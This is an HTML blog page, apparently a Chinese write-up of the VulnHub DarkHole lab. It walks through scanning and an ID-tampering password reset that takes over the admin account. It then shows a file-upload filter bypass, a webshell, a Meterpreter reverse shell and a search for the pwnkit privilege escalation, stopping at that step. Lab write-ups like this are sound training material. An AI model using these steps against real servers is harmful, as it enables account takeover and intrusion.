@@ -1,0 +1,757 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机说明 靶机说明：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;darkhole-1,724 下载地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;darkhole&#x2F;DarkHole.zip  主机发现123456789101112131415161718┌──(kali㉿kali)-[&#x2F;miao&#x2F;vulnhub&#x2F;Darkhole]└─$ sudo nmap -sn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DarkHole">
+<meta property="og:url" content="http://miao-sec.github.io/vulnhub/DarkHole/index.html">
+<meta property="og:site_name" content="Miao&#39;s Blog">
+<meta property="og:description" content="靶机说明 靶机说明：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;darkhole-1,724 下载地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;darkhole&#x2F;DarkHole.zip  主机发现123456789101112131415161718┌──(kali㉿kali)-[&#x2F;miao&#x2F;vulnhub&#x2F;Darkhole]└─$ sudo nmap -sn">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082219936.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082223499.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082226003.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082227756.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082227820.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082231600.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082233843.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082235415.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082248782.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082255157.png">
+<meta property="article:published_time" content="2025-06-20T02:54:47.000Z">
+<meta property="article:modified_time" content="2025-06-20T02:56:46.603Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="提权-pwnkit">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082219936.png">
+  
+  
+  
+  <title>DarkHole - Miao&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Miaosec</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DarkHole"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-20 10:54" pubdate>
+          2025年6月20日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">DarkHole</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul>
+<li>靶机说明：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/darkhole-1,724">https://www.vulnhub.com/entry/darkhole-1,724</a></li>
+<li>下载地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/darkhole/DarkHole.zip">https://download.vulnhub.com/darkhole/DarkHole.zip</a></li>
+</ul>
+<h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.1.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 19:45 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.1<br>Host is up (0.00035s latency).<br>MAC Address: 00:50:56:C0:00:08 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.2<br>Host is up (0.00053s latency).<br>MAC Address: 00:50:56:E8:96:F1 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.4<br>Host is up (0.00052s latency).<br>MAC Address: 00:0C:29:61:27:92 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.254<br>Host is up (0.00028s latency).<br>MAC Address: 00:50:56:EF:22:46 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.5<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="hljs-keyword">in</span> 2.04 seconds<br></code></pre></td></tr></table></figure>
+<h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 192.168.1.4 -oA nmapscan/ports                <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 19:46 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.4<br>Host is up (0.0058s latency).<br>Not shown: 65533 closed tcp ports (conn-refused)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 00:0C:29:61:27:92 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1.75 seconds<br></code></pre></td></tr></table></figure>
+<ul>
+<li>开放端口22和80<br>（2）对端口细节进行扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p22,80 192.168.1.4 -oA nmapscan/detail<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 19:47 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.4<br>Host is up (0.0029s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br>MAC Address: 00:0C:29:61:27:92 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.63 seconds<br></code></pre></td></tr></table></figure></li>
+</ul>
+<p>（3）进行UDP扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sU -p22,80 192.168.1.4 -oA nmapscan/udp                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 19:48 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.4<br>Host is up (0.00033s latency).<br><br>PORT   STATE  SERVICE<br>22/udp closed ssh<br>80/udp closed http<br>MAC Address: 00:0C:29:61:27:92 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 0.20 seconds<br><br></code></pre></td></tr></table></figure>
+
+<p>（4）进行漏洞扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80 192.168.1.4 -oA nmapscan/vuln      <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 19:48 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.4<br>Host is up (0.00049s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-cookie-flags: </span><br><span class="hljs-string">|   /: </span><br><span class="hljs-string">|     PHPSESSID: </span><br><span class="hljs-string">|       httponly flag not set</span><br><span class="hljs-string">|   /login.php: </span><br><span class="hljs-string">|     PHPSESSID: </span><br><span class="hljs-string">|_      httponly flag not set</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.1.4</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.1.4:80/login.php</span><br><span class="hljs-string">|     Form id: login__username</span><br><span class="hljs-string">|     Form action: login.php</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.1.4:80/register.php</span><br><span class="hljs-string">|     Form id: login__username</span><br><span class="hljs-string">|_    Form action: </span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-enum: <br>|   /login.php: Possible admin folder<br>|   /config/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.41 (ubuntu)&#x27;</span><br>|   /css/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.41 (ubuntu)&#x27;</span><br>|   /js/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.41 (ubuntu)&#x27;</span><br>|_  /upload/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.41 (ubuntu)&#x27;</span><br>MAC Address: 00:0C:29:61:27:92 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 31.21 seconds<br></code></pre></td></tr></table></figure>
+
+<h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.1.4 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.1.4<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 276]<br>/.php                 (Status: 403) [Size: 276]<br>/index.php            (Status: 200) [Size: 810]<br>/login.php            (Status: 200) [Size: 2507]<br>/register.php         (Status: 200) [Size: 2886]<br>/upload               (Status: 301) [Size: 311] [--&gt; http://192.168.1.4/upload/]<br>/css                  (Status: 301) [Size: 308] [--&gt; http://192.168.1.4/css/]<br>/js                   (Status: 301) [Size: 307] [--&gt; http://192.168.1.4/js/]<br>/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]<br>/config               (Status: 301) [Size: 311] [--&gt; http://192.168.1.4/config/]<br>/dashboard.php        (Status: 200) [Size: 21]<br>/.php                 (Status: 403) [Size: 276]<br>/.html                (Status: 403) [Size: 276]<br>/server-status        (Status: 403) [Size: 276]<br>Progress: 830572 / 830576 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+<p>（2）访问80端口，存在一个登录页面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082219936.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="web逻辑漏洞"><a href="#web逻辑漏洞" class="headerlink" title="web逻辑漏洞"></a>web逻辑漏洞</h2><p>（1）注册一个新用户，进行登录，发现可以更改用户的密码<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082223499.png" srcset="/img/loading.gif" lazyload><br>（2）进行抓包，查看修改密码的数据包，发现有<code>id</code>标识<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082226003.png" srcset="/img/loading.gif" lazyload><br>（3）尝试将<code>id</code>修改为1<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082227756.png" srcset="/img/loading.gif" lazyload><br>（4）尝试进行登录，成功进行登录，登录后存在一个文件上传的功能<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082227820.png" srcset="/img/loading.gif" lazyload><br>（5）进行文件上传，尝试上传一个webshell，提示只允许<code>jpg,png,gif</code>上传<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082231600.png" srcset="/img/loading.gif" lazyload><br>（6）经过尝试，最后将文件的后缀修改为<code>.phmtl</code>，即可成功进行上传<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082233843.png" srcset="/img/loading.gif" lazyload><br>（7）使用哥斯拉进行连接，成功进入<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082235415.png" srcset="/img/loading.gif" lazyload><br>（8）由于哥斯拉里面的shell，不属于稳定的shell，所以需要反弹一个稳定的shell</p>
+<ul>
+<li><p>使用哥斯拉中的<code>PMeterpreter</code>进行反弹shell<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082248782.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/multi/handler<br>[*] Using configured payload generic/shell_reverse_tcp<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload php/meterpreter/reverse_tcp<br>payload =&gt; php/meterpreter/reverse_tcp<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> lhost 0.0.0.0<br>lhost =&gt; 0.0.0.0<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> lport 4444<br>lport =&gt; 4444<br>msf6 exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 0.0.0.0:4444 <br>[*] Sending stage (39927 bytes) to 192.168.1.4<br>[*] Meterpreter session 1 opened (192.168.1.5:4444 -&gt; 192.168.1.4:37968) at 2025-02-08 22:47:24 +0800<br><br>meterpreter &gt; <br><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="提权-pwnkit"><a href="#提权-pwnkit" class="headerlink" title="提权-pwnkit"></a>提权-pwnkit</h1><p>（1）使用脚本<code>linux-exploit-suggester.sh</code>查看哪些可以进行提权，将脚本上传至临时目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; upload /miao/vulnhub/lampiao/linux-exploit-suggester.sh /tmp/1.sh<br>[*] Uploading  : /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>[*] Uploaded -1.00 B of 88.80 KiB (-0.0%): /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>[*] Completed  : /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>meterpreter &gt; <br></code></pre></td></tr></table></figure>
+<p>（2）执行脚本，查看可以用什么方式进行提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 10161 created.<br>Channel 1 created.<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">chmod</span> +x 1.sh<br>./1.sh<br></code></pre></td></tr></table></figure>
+<p>（3）找到<code>cve_2021_4034</code>的漏洞利用<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082255157.png" srcset="/img/loading.gif" lazyload><br>（4）使用msf，寻找漏洞利用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; background<br>[*] Backgrounding session 1...<br>msf6 exploit(multi/handler) &gt; search cve_2021_4034<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#  Name                                                 Disclosure Date  Rank       Check  Description</span><br>   -  ----                                                 ---------------  ----       -----  -----------<br>   0  exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec  2022-01-25       excellent  Yes    Local Privilege Escalation <span class="hljs-keyword">in</span> polkits pkexec<br>   1    \_ target: x86_64                                  .              <br>   2    \_ target: x86                                     .    <br>   3    \_ target: aarch64                                 .              <br><br>Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                                                                                           <br>After interacting with a module you can manually <span class="hljs-built_in">set</span> a TARGET with <span class="hljs-built_in">set</span> TARGET <span class="hljs-string">&#x27;aarch64&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>（5）找到一个可利用的</p>
